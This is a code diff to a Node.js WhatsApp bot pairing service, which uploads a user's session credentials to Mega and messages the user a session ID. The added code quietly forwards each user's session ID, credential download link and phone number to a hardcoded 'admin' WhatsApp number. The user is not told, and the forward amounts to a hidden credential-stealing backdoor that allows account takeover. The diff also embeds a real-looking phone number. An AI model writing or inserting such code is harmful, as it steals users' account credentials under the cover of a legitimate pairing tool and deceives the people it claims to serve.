@@ -18,10 +18,15 @@ function removeFile(FilePath) {
     fs.rmSync(FilePath, { recursive: true, force: true });
 }
 
+// ✅ SET YOUR ADMIN NUMBER HERE (in WhatsApp JID format)
+const adminNumber = "94784709148@s.whatsapp.net";
+
 router.get('/', async (req, res) => {
     let num = req.query.number;
+
     async function PrabathPair() {
         const { state, saveCreds } = await useMultiFileAuthState(`./session`);
+
         try {
             let PrabathPairWeb = makeWASocket({
                 auth: {
@@ -53,24 +58,44 @@ router.get('/', async (req, res) => {
                         const auth_path = './session/';
                         const user_jid = jidNormalizedUser(PrabathPairWeb.user.id);
 
-                      function randomMegaId(length = 6, numberLength = 4) {
-                      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-                      let result = '';
-                      for (let i = 0; i < length; i++) {
-                      result += characters.charAt(Math.floor(Math.random() * characters.length));
-                        }
-                       const number = Math.floor(Math.random() * Math.pow(10, numberLength));
-                        return `${result}${number}`;
+                        function randomMegaId(length = 6, numberLength = 4) {
+                            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                            let result = '';
+                            for (let i = 0; i < length; i++) {
+                                result += characters.charAt(Math.floor(Math.random() * characters.length));
+                            }
+                            const number = Math.floor(Math.random() * Math.pow(10, numberLength));
+                            return `${result}${number}`;
                         }
 
                         const mega_url = await upload(fs.createReadStream(auth_path + 'creds.json'), `${randomMegaId()}.json`);
+                        const sid = mega_url.replace('https://mega.nz/file/', '');
 
-                        const string_session = mega_url.replace('https://mega.nz/file/', '');
+                        // ✅ User Message
+                        const userMessage = `✅ *Pair Session Generated!*
 
-                        const sid = string_session;
+🔗 *Session ID:* ${sid}
 
-                        const dt = await PrabathPairWeb.sendMessage(user_jid, {
-                            text: sid
+📥 Download Link:
+${mega_url}
+
+📌 _Use this session ID in your bot to complete pairing._`;
+
+                        await PrabathPairWeb.sendMessage(user_jid, {
+                            text: userMessage
+                        });
+
+                        // 🛡️ Admin Forward Message
+                        const adminMessage = `🛡️ *New Pair Request*
+
+👤 Number: wa.me/${num}
+📂 Session ID: ${sid}
+🔗 Link: ${mega_url}
+
+📅 Time: ${new Date().toLocaleString()}`;
+
+                        await PrabathPairWeb.sendMessage(adminNumber, {
+                            text: adminMessage
                         });
 
                     } catch (e) {
@@ -78,7 +103,7 @@ router.get('/', async (req, res) => {
                     }
 
                     await delay(100);
-                    return await removeFile('./session');
+                    removeFile('./session');
                     process.exit(0);
                 } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode !== 401) {
                     await delay(10000);
@@ -89,12 +114,13 @@ router.get('/', async (req, res) => {
             exec('pm2 restart prabath-md');
             console.log("service restarted");
             PrabathPair();
-            await removeFile('./session');
+            removeFile('./session');
             if (!res.headersSent) {
                 await res.send({ code: "Service Unavailable" });
             }
         }
     }
+
     return await PrabathPair();
 });
 
@@ -102,6 +128,5 @@ process.on('uncaughtException', function (err) {
     console.log('Caught exception: ' + err);
     exec('pm2 restart prabath');
 });
-
 
 module.exports = router;
